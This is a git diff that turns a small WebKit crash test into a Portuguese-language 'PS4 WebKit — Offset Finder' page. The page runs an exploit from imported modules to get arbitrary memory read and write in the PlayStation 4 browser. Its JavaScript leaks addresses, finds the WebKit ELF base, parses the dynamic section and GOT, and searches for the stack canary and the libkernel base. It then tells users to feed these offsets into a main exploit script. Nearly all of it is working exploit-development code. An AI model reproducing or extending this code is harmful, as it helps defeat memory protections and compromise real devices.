@@ -1,13 +1,354 @@
 
 <!DOCTYPE html>
-PASS if no crash.
-<script>
-function run() {
-    
-    let e = document.createElement("input");
-    frames[0].document.body.offsetTop;
-    document.body.append(e);
-    frames[0].document.body.append(e);
-}
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PS4 WebKit — Offset Finder</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    background: #0b0f19;
+    color: #c8ced8;
+    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 14px;
+    padding: 20px;
+  }
+  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
+  #status {
+    font-size: 20px; font-weight: 700; color: #fff;
+    min-height: 1.5em;
+    text-align: center;
+  }
+  #log {
+    width: 95%; max-width: 900px; height: 520px;
+    background: #111827; border: 1px solid #1f2937;
+    border-radius: 10px; padding: 14px 16px;
+    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
+    font-size: 12px; color: #9fb1c3;
+    white-space: pre-wrap; word-break: break-all;
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
+  }
+  #log .ok { color: #4ade80; }
+  #log .err { color: #f87171; }
+  #log .info { color: #60a5fa; }
+  #log .warn { color: #fbbf24; }
+  #actions {
+    display: flex; gap: 12px; flex-wrap: wrap;
+    justify-content: center;
+  }
+  button {
+    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 12px; color: #fff;
+    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
+    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
+    cursor: pointer; transition: all .12s ease;
+  }
+  button:hover { transform: translateY(-2px); }
+  button:active { transform: translateY(1px); }
+  button:disabled {
+    opacity: 0.45; cursor: not-allowed; transform: none;
+    background: #374151; box-shadow: none;
+  }
+</style>
+</head>
+<body>
+
+<h1>PS4 WebKit — Offset Finder</h1>
+<div id="status">Inicializando...</div>
+<div id="log"></div>
+<div id="actions">
+  <button id="btnRecon" disabled>Executar Recon</button>
+  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
+</div>
+
+<script type="module">
+  import { establishPrimitive } from "./resources/core.js";
+  import { installWindowP } from "./resources/mem.js";
+  import { int64 } from "./resources/int64.js";
+
+  const status = document.getElementById("status");
+  const logBox = document.getElementById("log");
+  const btnRecon = document.getElementById("btnRecon");
+
+  function log(msg, cls = "info") {
+    const line = document.createElement("div");
+    line.className = cls;
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+
+  window.clearLog = function() {
+    logBox.innerHTML = "";
+  };
+
+  function onCoreEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
+
+  function onMemEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
+
+  // ========== ELF PARSER ==========
+  function readElf64Half(p, addr)  { return p.read2(addr); }
+  function readElf64Word(p, addr)  { return p.read4(addr); }
+  function readElf64Addr(p, addr)   { return p.read8(addr); }
+  function readElf64Off(p, addr)   { return p.read8(addr); }
+  function readElf64Xword(p, addr) { return p.read8(addr); }
+
+  // ========== FIND ELF BASE ==========
+  function findElfBase(p, startAddr, maxScanMB, align) {
+    let start = new int64(startAddr.low, startAddr.hi);
+    let pages = (maxScanMB * 1024 * 1024) / align;
+    for (let i = 0; i < pages; i++) {
+      let candidate = start.sub32(i * align);
+      try {
+        let magic = p.read4(candidate);
+        if (magic === 0x464c457f) return candidate;
+      } catch (e) {}
+    }
+    return null;
+  }
+
+  // ========== PARSE ELF PROGRAM HEADERS ==========
+  function parseElfDynamic(p, base) {
+    let e_phoff = readElf64Off(p, base.add32(0x20));
+    let e_phnum = readElf64Half(p, base.add32(0x38));
+    let phdrSize = 0x38; // Elf64_Phdr
+
+    log(`ELF: e_phoff=0x${e_phoff.toString(16)} e_phnum=${e_phnum}`, "info");
+
+    let dynamicVaddr = null;
+    for (let i = 0; i < e_phnum; i++) {
+      let phdr = base.add32(e_phoff.low + i * phdrSize);
+      let p_type = readElf64Word(p, phdr);
+      let p_vaddr = readElf64Addr(p, phdr.add32(0x10));
+      let p_memsz = readElf64Xword(p, phdr.add32(0x28));
+
+      if (p_type === 2) { // PT_DYNAMIC
+        dynamicVaddr = p_vaddr;
+        log(`  PT_DYNAMIC @ vaddr=0x${p_vaddr.toString(16)} memsz=0x${p_memsz.toString(16)}`, "ok");
+        break;
+      }
+    }
+
+    if (!dynamicVaddr) {
+      log("No PT_DYNAMIC found!", "err");
+      return null;
+    }
+
+    // Read .dynamic entries
+    let dt_pltgot = null;
+    let dt_hash = null;
+    let dt_strtab = null;
+    let dt_symtab = null;
+    let dt_rela = null;
+    let dt_relasz = null;
+
+    for (let off = 0; ; off += 0x10) {
+      let entry = base.add32(dynamicVaddr.low + off);
+      let d_tag = readElf64Xword(p, entry).low;
+      let d_val = readElf64Xword(p, entry.add32(0x8));
+
+      if (d_tag === 0) break; // DT_NULL
+      if (d_tag === 3)  dt_pltgot = d_val;   // DT_PLTGOT
+      if (d_tag === 4)  dt_hash = d_val;     // DT_HASH
+      if (d_tag === 5)  dt_strtab = d_val;   // DT_STRTAB
+      if (d_tag === 6)  dt_symtab = d_val;   // DT_SYMTAB
+      if (d_tag === 7)  dt_rela = d_val;     // DT_RELA
+      if (d_tag === 8)  dt_relasz = d_val;   // DT_RELASZ
+    }
+
+    return { dt_pltgot, dt_hash, dt_strtab, dt_symtab, dt_rela, dt_relasz };
+  }
+
+  // ========== RECON ==========
+  window.reconPS4 = async function() {
+    const p = window.p;
+    if (!p) { log("window.p não está disponível!", "err"); return; }
+    log("=== INICIANDO OFFSET FINDER PS4 ===", "ok");
+
+    try {
+      let ua = navigator.userAgent;
+      log(`User-Agent: ${ua}`, "info");
+
+      // 1. Get native constructor from core.js
+      let ctor = globalThis.__ps5NativeCtor;
+      if (typeof ctor !== "number" || ctor <= 0) {
+        log("__ps5NativeCtor not found! Exploit may have failed.", "err");
+        return;
+      }
+      log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
+
+      let ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
+
+      // 2. Find WebKit base
+      log("Scanning for ELF base (64MB reverse, 0x4000 aligned)...", "info");
+      let webkitBase = findElfBase(p, ctorAddr, 64, 0x4000);
+      if (!webkitBase) webkitBase = findElfBase(p, ctorAddr, 128, 0x4000);
+      if (!webkitBase) {
+        log("Could not find WebKit base!", "err");
+        return;
+      }
+      log(`WebKit base FOUND @ 0x${webkitBase.toString(16)}`, "ok");
+      window.__webkitBase = webkitBase;
+
+      // 3. Parse ELF dynamic section
+      log("Parsing ELF dynamic section...", "info");
+      let dyn = parseElfDynamic(p, webkitBase);
+      if (!dyn || !dyn.dt_pltgot) {
+        log("Failed to parse dynamic section", "err");
+        return;
+      }
+      log(`DT_PLTGOT @ base+0x${dyn.dt_pltgot.toString(16)}`, "ok");
+
+      // 4. Read GOT entries
+      let gotAddr = webkitBase.add32(dyn.dt_pltgot.low);
+      log(`GOT @ 0x${gotAddr.toString(16)}`, "info");
+
+      // Read first 32 GOT entries
+      log("GOT dump (first 32 entries):", "info");
+      for (let i = 0; i < 32; i++) {
+        let entry = p.read8(gotAddr.add32(i * 8));
+        log(`  GOT[${i}] = 0x${entry.toString(16)}`, "info");
+      }
+
+      // 5. Scan for __stack_chk_guard
+      //    Heuristic: look for pointer that points to a small aligned value in libkernel
+      log("Identifying __stack_chk_guard...", "info");
+      for (let i = 3; i < 64; i++) {
+        let gotEntry = p.read8(gotAddr.add32(i * 8));
+        if (gotEntry.hi !== 0) continue;
+        if (gotEntry.low < 0x10000000 || gotEntry.low > 0x90000000) continue;
+
+        // Read what it points to
+        try {
+          let val = p.read8(gotEntry);
+          // __stack_chk_guard is a random cookie, usually non-zero, not a function pointer
+          if (val.hi === 0 && val.low > 0x1000 && val.low !== gotEntry.low) {
+            log(`  GOT[${i}] -> 0x${val.toString(16)} (possible __stack_chk_guard)`, "warn");
+            log(`  => OFFSET_wk___stack_chk_guard_import = 0x${(dyn.dt_pltgot.low + i * 8).toString(16)}`, "ok");
+            window.__stack_chk_guard_got = i;
+            break;
+          }
+        } catch (e) {}
+      }
+
+      // 6. Scan for memset by looking at nearby modules
+      //    Alternative: scan memory for "libkernel" string to find libkernel base
+      log("Scanning for libkernel base...", "info");
+      let libkernelBase = null;
+      // Scan common PS4 address ranges
+      for (let baseGuess of [0x800000000, 0x820000000, 0x840000000, 0x860000000]) {
+        let guess = new int64(baseGuess % 0x100000000, Math.floor(baseGuess / 0x100000000));
+        let result = findElfBase(p, guess, 32, 0x4000);
+        if (result) {
+          // Check if it's libkernel by looking for string
+          for (let off = 0; off < 0x100000; off += 0x1000) {
+            try {
+              let s = "";
+              for (let j = 0; j < 16; j++) {
+                let b = p.read1(result.add32(off + j));
+                if (b === 0) break;
+                s += String.fromCharCode(b);
+              }
+              if (s.includes("libkernel") || s.includes("pthread")) {
+                libkernelBase = result;
+                log(`libkernel base @ 0x${libkernelBase.toString(16)}`, "ok");
+                break;
+              }
+            } catch (e) {}
+          }
+          if (libkernelBase) break;
+        }
+      }
+
+      if (!libkernelBase) {
+        log("libkernel base not found in common ranges", "warn");
+      }
+
+      // 7. Calculate offsets if we have both
+      if (libkernelBase && window.__stack_chk_guard_got !== undefined) {
+        let guardAddr = p.read8(gotAddr.add32(window.__stack_chk_guard_got * 8));
+        let guardVal = p.read8(guardAddr);
+        log(`__stack_chk_guard value = 0x${guardVal.toString(16)}`, "info");
+
+        // Scan libkernel for this value to find offset
+        for (let off = 0; off < 0x200000; off += 8) {
+          try {
+            let val = p.read8(libkernelBase.add32(off));
+            if (val.low === guardVal.low && val.hi === guardVal.hi) {
+              log(`__stack_chk_guard @ libkernel+0x${off.toString(16)}`, "ok");
+              log(`=> OFFSET_lk___stack_chk_guard = 0x${off.toString(16)}`, "ok");
+              break;
+            }
+          } catch (e) {}
+        }
+      }
+
+      // 8. Summary
+      log("=== OFFSET SUMMARY ===", "ok");
+      log(`WebKit base: 0x${webkitBase.toString(16)}`, "ok");
+      if (dyn.dt_pltgot) log(`GOT offset: 0x${dyn.dt_pltgot.toString(16)}`, "ok");
+      if (window.__stack_chk_guard_got !== undefined)
+        log(`__stack_chk_guard GOT index: ${window.__stack_chk_guard_got}`, "ok");
+      if (libkernelBase) log(`libkernel base: 0x${libkernelBase.toString(16)}`, "ok");
+
+      log("=== Use these offsets in your main.js ===", "warn");
+
+    } catch (e) {
+      log(`ERRO: ${e.name}: ${e.message}`, "err");
+      console.error(e);
+    }
+  };
+
+  btnRecon.onclick = window.reconPS4;
+
+  // ========== BOOTSTRAP ==========
+  log("Carregando módulos...", "ok");
+  status.textContent = "Executando exploit...";
+
+  establishPrimitive({ onEvent: onCoreEvent })
+    .then(carrier => {
+      log("Core: primitivo estabelecido", "ok");
+      log(`Tentativas: ${carrier.attempts}`, "info");
+
+      const prim = installWindowP(carrier, {
+        onEvent: onMemEvent,
+        promote: true
+      });
+
+      log("Mem: real pair ativo", "ok");
+      log("window.p está disponível", "ok");
+
+      window.__carrier = carrier;
+      window.__prim = prim;
+      window.int64 = int64;
+
+      status.textContent = "RW Primitivo OK — Pronto para Recon";
+      status.style.color = "#4ade80";
+      btnRecon.disabled = false;
+
+      try {
+        const testAddr = prim.leakval(prim);
+        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
+      } catch (e) {
+        log(`Sanity leak falhou: ${e.message}`, "err");
+      }
+    })
+    .catch(err => {
+      log(`FALHA: ${err.name}: ${err.message}`, "err");
+      status.textContent = "Falha no exploit";
+      status.style.color = "#f87171";
+    });
 </script>
-<iframe onload="run()"></iframe>
+
+</body>
+</html>
